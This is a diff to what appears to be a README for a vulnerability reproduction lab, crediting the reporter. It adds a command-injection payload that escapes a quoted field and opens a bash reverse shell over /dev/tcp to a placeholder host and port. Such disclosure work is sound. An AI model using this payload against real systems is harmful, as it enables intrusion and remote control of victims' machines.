@@ -57,6 +57,11 @@ A detailed root cause of the vulnerability is available in the [original securit
 5. Click the "*Create*" button.
 6. Check under `/tmp` the presence of the created file.
 
+To obtain a reverse shell, a payload like the following can be used.
+```
+public\' ; bash -c "exec bash -i &>/dev/tcp/<host>/<port> <&1" ; \'
+```
+
 ## Authors
 
 * **Antonio Francesco Sardella** - *vulnerability reporter* - [m3ssap0](https://github.com/m3ssap0)
